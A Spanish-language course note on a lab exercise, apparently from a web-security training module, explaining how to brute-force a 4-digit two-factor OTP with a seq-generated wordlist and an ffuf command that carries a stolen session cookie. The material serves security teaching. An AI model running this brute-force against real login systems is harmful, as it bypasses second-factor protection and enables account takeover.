# Módulo 08 — Broken Authentication

## Sección 6/14: Brute-Forcing 2FA Codes

> [!NOTE]
> Un TOTP débil (corto, solo dígitos) puede brute-forcearse igual que un reset token. Asume que el atacante ya tiene credenciales válidas pero necesita evadir la segunda capa.

## 🎯 Contexto del ataque

Credenciales obtenidas previamente (ej. phishing): `admin:admin`. Al login, la app pide un OTP de 4 dígitos.

## 🛠️ Preparando el ataque

- OTP viaja en `otp` (POST)
- Sesión identificada vía cookie `PHPSESSID`

> [!WARNING]
> A diferencia del reset token, el OTP está asociado a una sesión ya autenticada con password — sin enviar la cookie correcta, el brute-force no tiene contexto.

```bash
seq -w 0 9999 > tokens.txt

ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
  -d "otp=FUZZ" \
  -fr "Invalid 2FA Code"
```

> [!WARNING]
> Interpretando múltiples "hits": una vez que el OTP correcto es aceptado, la sesión queda marcada como autenticada — todos los intentos posteriores también reciben 302, independientemente del OTP. El **primer** hit cronológico es el OTP real.

## 🧠 Quiz de repaso

<details>
<summary>¿Por qué aparecen múltiples resultados positivos en el brute-force de 2FA?</summary>

Porque el 2FA altera el estado de la sesión de forma persistente: una vez aceptado el OTP correcto, la sesión queda marcada como autenticada, y cualquier request posterior con esa cookie hereda ese estado, aunque el OTP en sí sea irrelevante en esos casos.

</details>

<details>
<summary>¿Por qué este ataque asume que el atacante ya posee credenciales válidas?</summary>

Porque el 2FA es una capa adicional que se activa después de una autenticación exitosa con el primer factor — para llegar a la pantalla de OTP, es necesario haber superado ya el primer factor.

</details>

> [!NOTE]
> **Ejercicio práctico (lab)** — El lab pide brute-forcear el 2FA del usuario admin (login previo con admin:admin). Metodología: obtener cookie de sesión, generar wordlist con seq -w, ffuf con la cookie incluida, quedarse con el primer resultado positivo.

## 🔗 Relacionado
- [05 — Brute-Forcing Password Reset Tokens](05-brute-forcing-password-reset-tokens.md)
- [04 — Brute-Forcing Passwords](04-brute-forcing-passwords.md)
- [07 — Weak Brute-Force Protection](07-weak-brute-force-protection.md)

#cwes #modulo08 #broken-authentication #2fa #totp #brute-force #ffuf
